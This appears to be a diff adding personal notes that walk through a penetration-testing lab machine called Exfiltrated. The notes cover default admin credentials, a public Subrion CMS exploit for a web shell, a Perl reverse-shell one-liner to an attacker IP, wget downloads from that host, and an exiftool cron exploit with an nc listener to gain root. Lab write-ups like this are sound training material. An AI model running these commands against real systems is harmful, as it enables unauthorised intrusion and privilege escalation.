@@ -1,0 +1,39 @@
+Exfiltrated 192.168.159.163
+
+I tried access http but failed redirected on http://exfiltrated.offsec/
+I made entry in /etc/hosts
+http://exfiltrated.offsec/
+login with default username and password admin:admin
+sucess 
+find Subrion version 4.2.1 installed. Cheers!
+
+https://www.exploit-db.com/exploits/49876
+
+python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
+Got web-shell
+python3 -c 'import pty;pty.spawn("/bin/bash")' (Failled)
+
+Plan connect using reverse shell 
+
+I tried multiple for reverse shell but got success 
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.173:9001");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+wget http://192.168.45.173:440/lse.sh
+In corntab section /opt/image-exif.sh running continue
+
+cat /opt/image-exif.sh
+exiftool is involved in this script
+searched on google exiftool exploit
+https://www.exploit-db.com/exploits/50911
+Run first time got error 
+
+sudo apt install djvulibre-bin exiftool
+run it again 
+python3 50911.py -s 192.168.45.173 4545 
+
+cd /var/www/html/subrion/uploads
+wget http://192.168.45.173:440/image.jpg
+
+nc -nvlp 4545
+wait for shell 
+i got root
